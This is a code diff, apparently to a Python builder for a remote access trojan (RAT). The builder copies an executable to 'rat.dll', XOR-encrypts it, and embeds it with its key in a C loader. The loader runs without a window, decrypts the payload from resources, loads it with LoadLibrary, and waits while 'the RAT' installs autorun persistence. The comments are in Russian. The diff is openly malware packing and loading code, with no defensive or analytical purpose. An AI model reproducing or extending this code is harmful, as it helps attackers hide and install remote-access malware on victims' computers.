@@ -10,7 +10,7 @@ def generate_random_name():
 
 def build_single_exe_with_dll(exe_path):
     print("=" * 60)
-    print("BUILDING EXE TO DLL CONVERTER")
+    print("BUILDING EXE TO DLL (SIMPLE)")
     print("=" * 60)
     
     if not os.path.exists(exe_path):
@@ -31,26 +31,10 @@ def build_single_exe_with_dll(exe_path):
         return None
     print("EXE header OK (MZ)")
     
-    # Конвертируем EXE в DLL
-    print("Converting EXE to DLL...")
+    # Просто копируем EXE как DLL
+    print("Converting EXE to DLL (simple rename)...")
     dll_path = os.path.join(output_dir, 'rat.dll')
-    
-    # Способ 1: Просто переименовываем (иногда работает)
-    # shutil.copy2(exe_path, dll_path)
-    
-    # Способ 2: Используем pe2dll (если установлен)
-    try:
-        result = subprocess.run(['pe2dll.exe', exe_path, dll_path], capture_output=True)
-        if result.returncode == 0:
-            print("PE2DLL conversion OK")
-        else:
-            # Если pe2dll нет - просто копируем
-            shutil.copy2(exe_path, dll_path)
-            print("PE2DLL not found, using copy method")
-    except:
-        shutil.copy2(exe_path, dll_path)
-        print("PE2DLL not found, using copy method")
-    
+    shutil.copy2(exe_path, dll_path)
     print(f"DLL size: {os.path.getsize(dll_path) / (1024*1024):.1f} MB")
     
     print("Encrypting DLL with XOR...")
@@ -80,9 +64,6 @@ def build_single_exe_with_dll(exe_path):
 
 #pragma comment(linker, "/SUBSYSTEM:WINDOWS")
 #pragma comment(linker, "/ENTRY:mainCRTStartup")
-
-// Данные вставляются через ресурсы
-// Используем простой XOR
 
 int main() {
     char dll_path[MAX_PATH];
@@ -116,7 +97,6 @@ int main() {
     DWORD data_size = SizeofResource(hModule, hRes);
     unsigned char* enc_data = (unsigned char*)LockResource(hData);
     
-    // Расшифровываем XOR
     // Ключ тоже в ресурсах
     HRSRC hKeyRes = FindResourceA(hModule, MAKEINTRESOURCE(102), "KEY");
     if (!hKeyRes) {
@@ -168,7 +148,6 @@ int main() {
         return 1;
     }
     
-    // Запускаем RAT (DllMain уже выполнился при LoadLibrary)
     // Ждем пока RAT сделает автозагрузку
     Sleep(15000);
     
